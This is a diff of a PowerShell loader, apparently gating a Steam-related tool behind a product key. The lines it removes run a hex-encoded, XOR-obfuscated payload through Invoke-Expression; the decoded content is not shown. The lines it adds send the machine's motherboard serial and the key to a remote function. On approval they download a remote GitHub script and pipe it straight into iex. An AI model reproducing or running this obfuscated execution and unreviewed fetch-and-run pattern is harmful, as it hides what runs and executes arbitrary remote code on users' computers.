@@ -1,7 +1,17 @@
-$data = "5c d0 df d1 d4 a0 bd a0 d0 f3 d2 f4 d5 f3 df f4 df f6 d2 f3 a0 f1 d1 d7 a0 bb df f6 d3 d5 f4 d1 d6 a0 b9 d2 f4 d0 f5 a1 b0 d0 d3 f4 d4 f4 d2 a1 d4 df d3 d0 df f0 b6 f5 f4 f3 a0 b0 d0 f2 f1 f5 d7 a0 bd a0 b9 d4 d1 d0 b0 b1 d3 f1 f3 f4 a0 b2 d0 f3 d2 f4 d5 f3 df a0 d4 d7 a0 f1 d1 d7 f6 df f2 f4 d7 a0 df f4 a0 f1 d1 d0 d7 d4 f4 d7 a1 d5 d0 f1 d1 f4 a0 b2 d2 f4 d7 f3 a0 bb a0 b0 df f4 d0 f3 d2 f4 f3 f2 a1 d4 d7 d3 d0 f3 f2 d4 d7 f6 f3 d4 df f2 df f3 d4 f0 d2 d7 d3 f2 d1 a0 f0 d5 f1 f4 d1 df f4 f3 a1 d5 d0 a0 bd a0 f1 d1 d7 f6 d5 f4 f3 a0 d4 d1 d0 df d7 a0 d5 f3 f3 d2 d7 df d4 a1 f1 d1 b0 f3 d2 f4 d7 df f2 f4 d5 f3 a0 b0 d1 d3 f4 f2 f3 f4 a0 b0 d0 d0 d3 d0 df f1 b0 f3 f2 a0 bd a0 b2 d3 d1 d7 df d0 d4 d1 b0 b1 f1 d3 d7 f0 d5 f1 f4 d1 df f4 f3 b6 b1 b1 b1 f2 f4 a0 df d2 d2 d1 d0 b0 f3 a0 b1 d0 f3 d2 f4 d5 f3 df a1 f3 f4 d1 f4 d5 f3 a0 d1 d6 a0 b0 d1 d5 f4 d2 f1 f3 d2 f4 d1 d0 b0 a1 a0 b2 f2 d3 f4 d1 b0 b0 f1 f3 f4 a0 b0 d1 d3 f4 f2 f3 f4 a0 b0 b1 d1 d1 f2 f1 f4 d1 f4 d5 f3 b0 d0 d7 d3 d1 d3 a1 a0 b2 d5 f3 f3 d2 d7 df d4 a1 b2 d0 d3 d3 df f4 df d2 d7 a1 b0 b1 d1 d4 df d5 f1 f2 d3 f4 d1 d0 b1 a0 b4 f2 d1 d1 f2 a0 d4 d7 f3 b0 b1 f3 f4 d1 d6 b0 a0 b0 d0 f4 d4 f3 f3 d1 b0 f2 d1 d0 f1 d1 f4 f3 f2 d4 d7 f3 d5 f3 d1 f4 d1 f3 f2 d1 d0 d7 f3 b6 f3 d1 f4 f3 b6 d0 d1 d1 d4 f3 b6 f2 d1 d1 d0 f3 b6 f3 f4 d1 d1 f5 f3 d2 f4 d1 a1 f2 f3 d0 a1 d1 d1 d0 a0 b1 a0 d1 d1 f0 a0 d5 a0 d1 d4 d5 f1 f2 d3 f4 d1 d0 b0 b1 b1 b1 b1 d2 d1 d0 b0 a0 b1 d1 d0 f2 f1 f5 d7 a0 bd a0 b9 d4 d1 d0 b0 d1 f0 a0 d2 d1 f0 d1 f2 d3 f2 f1 f3 d2 d1 f4 d1 b0 b1 d3 d1 d7 df d0 d4 d1 b0 b1 f1 d3 d7 f0 d5 f1 f4 d1 df f4 f3 a0 b0 d3 d1 d0 f0 d3 d1 d0 b1 a0 d2 d3 f4 f2 a0 d2 d1 f0 d1 f0 d5 f1 f4 d1 d6 a0 bd a0 b0 df f4 d0 f3 d2 f4 d1 d0 d7 f3 a0 b2 d3 d1 d7 df d0 d4 d1 b0 b1 f1 d3 d7 f0 d5 f1 f4 d1 df f4 f3 b6 f0 d1 d3 f2 d1 a0 f0 d5 f1 f4 d1 df f4 f3 b6 f0 d1 d3 f2 d1 b0 d3 d1 d0 f0 d3 d1 d0 b6 d5 f3 f3 d2 d7 df d4 a1 d2 f4 d1 b0 f3 d2 f4 f3 d2 f1 f3 d1 a1 f3 d2 a1 d4 d7 d3 d0 d2 d1 f4 d1 a1 f2 f3 d0 a1 d1 d1 d0 f3 b1 d3 d1 f0 a0 d1 d1 f0 a0 b1 d2 d1 f0 d1 f0 d5 f1 f4 d1 d6 d1 a1 f3 f4 d1 d1 d5 f3 d2 f4 d1 b0 f3 d2 f4 f3 d2 f1 f3 d1 b1 d3 d1 f0 a0 f1 d1 f4 f3 f2 a0 b2 d3 d1 d7 df d0 d4 d1 b0 b1 f1 d3 d7 f0 d5 f1 f4 d1 df f4 f3 b6 d1 d1 d4"
+$hwid = (Get-CimInstance Win32_BaseBoard).SerialNumber.Trim()
+$keyword = Read-Host "Qual a sua chave do produto"
 
-$key = [char](176 / 2)
-$bytes = $data -split ' ' | ForEach-Object { [Convert]::ToInt32($_, 16) -bxor $key }
-$decrypted = [System.Text.Encoding]::UTF8.GetString($bytes)
+$url = "https://waedqlfiprmsdkwhjkea.supabase.co/functions/v1/smooth-worker"
+$body = @{ key = $keyword; hwid = $hwid } | ConvertTo-Json
 
-Invoke-Expression $decrypted
+try {
+    $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json"
+    
+    if ($response.status -eq "authorized") {
+        Write-Host "Acesso Permitido! Ativando..." -ForegroundColor Green
+        iwr -useb "https://raw.githubusercontent.com/VenezzaX/SteamFunDependencies/refs/heads/main/steampro.ps1" | iex
+    }
+} catch {
+    # This catch block will capture the 403 Forbidden and the 401 Invalid
+    Write-Host "Acesso Negado: Chave invalida ou ja vinculada a outro computador." -ForegroundColor Red
+}
